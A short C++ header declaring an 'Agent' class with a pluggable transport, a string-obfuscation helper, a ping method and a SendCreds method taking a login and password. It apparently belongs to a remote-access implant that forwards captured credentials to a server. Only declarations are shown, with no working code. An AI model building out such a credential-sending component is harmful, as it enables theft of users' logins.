#pragma once

#include "transport.h"
#include <cstdint>

class Agent {
private:
	Transport* transport;
	std::wstring localName;
	std::wstring domainName;
public:
	Agent(Transport* tr);
	Agent();

	static char *StringEncryption(char *text, char *key) noexcept;
	static void ClearBuffer(void* buffer, size_t len) noexcept;

	void SetTransport(Transport* transport);

	int Ping();
	int SendCreds(const std::wstring &login, const std::wstring &password) const noexcept;
};


